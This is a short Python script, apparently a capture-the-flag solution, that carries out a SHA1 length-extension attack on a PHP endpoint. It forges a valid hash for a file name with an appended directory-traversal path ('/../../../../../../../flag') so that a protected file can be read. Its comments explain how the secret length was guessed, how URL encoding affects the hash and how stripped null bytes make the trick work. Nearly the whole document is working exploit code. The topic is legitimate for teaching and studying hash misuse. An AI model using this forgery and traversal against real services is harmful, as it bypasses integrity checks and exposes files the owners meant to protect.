import hlextend
import urllib.parse

'''

If we didn't know the lenght of the secret key we would just need to bruteforce it, 
the lenght of the SECRET_SALT placeholder is 12, so when we also use 12 it 
works.

*** NOTE: need to be very careful with URL encoding, because if you don't URL encode
your extended data the hash will be incorrect, because PHP will URL-decode it before hashing.

**** NOTE: this only works because the \0's are stripped before calling for the file path, if they weren't
our appended data wouldn't load (would just load the PNG bcs of the null terminators, in 
url ENCODING it's %00

'''

# Known variables
known_hash = "a5fb9167c3c648c736069dc994e2a90e056ad5e5"
data = b"3.png"  # Original file name used in the hash
data_to_add = b"/../../../../../../../flag"  # The data you want to add
len_of_secret = 12  # Length of "TEST SECRET1"

# Create a new instance of the SHA1 length extension attack
sha = hlextend.new('sha1')

# Perform the length extension attack
extended_data = sha.extend(data_to_add, data, len_of_secret, known_hash)

# Get the new hash after the extension
new_hash = sha.hexdigest()

# URL encode the extended data to safely pass it as a query parameter
url_encoded_data = urllib.parse.quote(extended_data)

# Print the results
print("Extended data (URL-encoded):", url_encoded_data)
print("New hash:", new_hash)